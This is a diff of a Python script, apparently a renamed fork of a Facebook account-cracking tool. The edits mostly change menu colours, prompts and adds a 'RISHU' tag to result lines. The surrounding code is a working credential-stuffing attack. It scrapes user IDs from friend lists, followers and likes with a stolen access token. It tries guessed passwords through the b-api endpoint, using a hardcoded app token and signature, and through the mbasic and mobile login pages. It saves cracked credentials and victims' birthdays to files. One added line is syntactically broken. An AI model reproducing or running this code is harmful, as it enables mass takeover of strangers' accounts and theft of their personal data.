@@ -111,34 +111,34 @@ def menu():
 		time.sleep(3)
 		x_()
 	except requests.exceptions.ConnectionError:
-		print ('\033[0;91m !: No Connection')
+		print ('\033[0;91m [•] No Connection')
 		sys.exit()
 	logo()
-	print"\033[0;97m Hay\033[0;92m " +ngentod
+	print"\033[0;91m NAME\033[0;92m " +ngentod
 	print
-        print(" \033[0;91m╔══o00════════00o═════════════════════════╗")
+        print(" \033[0;91m╔═════════════════════════════╗")
 	print" \033[0;91m(01). \033[0;92mCrack from public Id"
 	print" \033[0;91m(02). \033[0;92mCrack from followers"
 	print" \033[0;91m(03). \033[0;92mCrack name search"
 	print" \033[0;91m(04). \033[0;92mCheck results "
-	print" \033[0;91m(00). \033[0;92m\033[0;97m Remove token"
-	print(" \033[0;91m╚═════════════════════════════════════════╝")
+	print" \033[0;91m(00). \033[0;92m\033[0;92m Remove token"
+	print(" \033[0;91m╚══════════════════════════════╝")
 	pilih_menu()
 
 def pilih_menu():
-	mi = raw_input("\n\033[0;97m ?: pilih : ")
+	mi = raw_input("\n\033[0;91m [•]choose : ")
 	if mi == "":
 		print
-		print ("\033[0;91m !: Fill in correctly") 
+		print ("\033[0;91m [•] Fill in correctly") 
 		exit()
 	elif mi in['1','01']:
-		print ("\n \033[0;92m!: Type 'me' to crack your own friend list") 
-		idt = raw_input(" \033[0;92m?: Id Public : ")
+		print ("\n \033[0;92m[•] Type 'me' to crack your own friend list") 
+		idt = raw_input(" \033[0;92m[•] Id Public : ")
 		try:
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
 		except KeyError:
-			print ("\033[0;91m !: Id not public") 
+			print ("\033[0;91m [•] Id not public") 
 			exit()
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 		z = json.loads(r.text)
@@ -148,13 +148,13 @@ def pilih_menu():
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 	elif mi in['2','02']:
-		print ("\n \033[0;92m!: Type 'me' to crack your own followers") 
-		idt = raw_input("\033[0;92m ?: Id Public : ")
+		print ("\n \033[0;92m[•] Type 'me' to crack your own followers") 
+		idt = raw_input("\033[0;92m [•] Id Public : ")
 		try:
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
 		except KeyError:
-			print (" \033[0;91m!: Id not public") 
+			print (" \033[0;91m[•] Id not public") 
 			exit()
 		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
 		z = json.loads(r.text)
@@ -164,7 +164,7 @@ def pilih_menu():
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 	elif mi in['33','003']:
-		idt = raw_input("\033[0;92m ?: Public Post Id link : ")
+		idt = raw_input("\033[0;92m [•] Public Post Id link : ")
 		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -196,19 +196,21 @@ def pilih_menu():
 		print ("\033[0;91m [•] choose the right one ") 
 		exit()
 	
-	print"\033[0;92m ?: total id  : " +str(len(id))
+	print"\033[0;92m [•] total id  : " +str(len(id))
 	anak_memek() 
 
 # Tambahan metode nya #
 def anak_memek():
 	print ("\n\033[0;92m [ Select the crack method ] \n")
+	print ("\n\033[0;91m╔══════════════════════════╗")
 	print ("\n\033[0;91m (01). \033[0;92mb-api (fast)")
 	print ("\n\033[0;91m (02). \033[0;92mmbasic (slow)")
-	#print ("\n\033[0;91m (03). \033[0;92mmobile (very slow)")
+	print ("\n\033[0;91m (03). \033[0;92mmobile (very slow)")
+	print (""\n\033[0;91m╚══════════════════════════╝")
 	romixyz()
 
 def romixyz():
-	rom = raw_input("\n \033[0;91m?: choose : ")
+	rom = raw_input("\n \033[0;91m[•] choose : ")
 	if rom =='':
 		print ("\033[0;91m [•] choose the right one ")
 		romixyz()
@@ -266,7 +268,7 @@ def langsungapi():
 				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
 				send=ses.get(api,params=param, headers=kontol)
 				if "access_token" in send.text and "EAAA" in send.text:
-					print '\r \033[0;92m[√] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r \033[0;92m[RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
 					ok.append(uid+' ◊ '+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -279,7 +281,7 @@ def langsungapi():
 						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
 						data = s.get(url).json()
 						ttl = data["birthday"]
-						print('\r\033[0;33m [×] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl )
+						print('\r\033[0;31m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl )
 						cp.append(uid+' ◊ '+pw+ ' ◊ ' +ttl )
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
 						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+str(ttl)+'\n')
@@ -288,7 +290,7 @@ def langsungapi():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print ('\r\033[0;33m [×] ' +uid+ ' ◊ ' + pw + '        ')
+					print ('\r\033[0;31m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        ')
 					cp.append(uid+' ◊ '+pw )
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -339,7 +341,7 @@ def manualbapi():
 				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
 				send=ses.get(api,params=param, headers=kontol)
 				if "access_token" in send.text and "EAAA" in send.text:
-					print '\r\033[0;92m [√] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;92m [RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
 					ok.append(uid+' ◊ '+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -352,7 +354,7 @@ def manualbapi():
 						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
-						print('\r\033[0;33m [×] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
+						print('\r\033[0;31m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
 						cp.append(uid+' ◊ '+pw+'◊'+ttl)
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
 						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+str(ttl)+'\n')
@@ -361,7 +363,7 @@ def manualbapi():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[0;33m [×] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;31m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        '
 					cp.append(uid+' ◊ '+pw)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -429,7 +431,7 @@ def langsungbasic():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print '\r \033[0;92m[√] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r \033[0;92m[RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
 					ok.append(uid+' ◊ '+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -443,7 +445,7 @@ def langsungbasic():
 						data = s.get(url).json()
 						nama = data['name']
 						ttl = data['birthday'].replace("/","-")
-						print('\r\033[0;91m [×] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
+						print('\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
 						cp.append(uid+' ◊ '+pw+' ◊ '+ttl)
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
 						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+ttl+'\n')
@@ -452,7 +454,7 @@ def langsungbasic():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[0;91m [×] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        '
 					cp.append(uid+' ◊ '+pw)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -494,7 +496,7 @@ def manualbasic():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print '\r\033[0;92m [√] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;92m [RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
 					ok.append(uid+' ◊ '+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -508,7 +510,7 @@ def manualbasic():
 						data = s.get(url).json()
 						nama = data['name']
 						ttl = data['birthday'].replace("/","-")
-						print('\r\033[0;91m [×] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
+						print('\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
 						cp.append(uid+' ◊ '+pw+'•'+ttl)
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
 						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+ttl+'\n')
@@ -517,7 +519,7 @@ def manualbasic():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[0;91m [×] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        '
 					cp.append(uid+' ◊ '+pw)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -566,7 +568,7 @@ def mobile():
 				rex = requests.post('https://mobile.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mobile_logout_button' in xo or 'save-device' in xo:
-					print '\r \033[0;92m[√] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r \033[0;92m[RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
 					ok.append(uid+' ◊ '+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -580,7 +582,7 @@ def mobile():
 						data = s.get(url).json()
 						nama = data['name']
 						ttl = data['birthday'].replace("/","-")
-						print('\r\033[0;91m [×] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
+						print('\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
 						cp.append(uid+' ◊ '+pw+' ◊ '+ttl)
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
 						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+ttl+'\n')
@@ -589,7 +591,7 @@ def mobile():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[0;91m [×] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        '
 					cp.append(uid+' ◊ '+pw)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -630,7 +632,7 @@ def m_fb():
 				rex = requests.post('https://mobile.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mobile_logout_button' in xo or 'save-device' in xo:
-					print '\r\033[0;92m [√] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;92m [RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
 					ok.append(uid+' ◊ '+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -644,7 +646,7 @@ def m_fb():
 						data = s.get(url).json()
 						nama = data['name']
 						ttl = data['birthday'].replace("/","-")
-						print('\r\033[0;91m [×] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
+						print('\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
 						cp.append(uid+' ◊ '+pw+'•'+ttl)
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
 						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+ttl+'\n')
@@ -653,7 +655,7 @@ def m_fb():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[0;91m [×] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        '
 					cp.append(uid+' ◊ '+pw)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
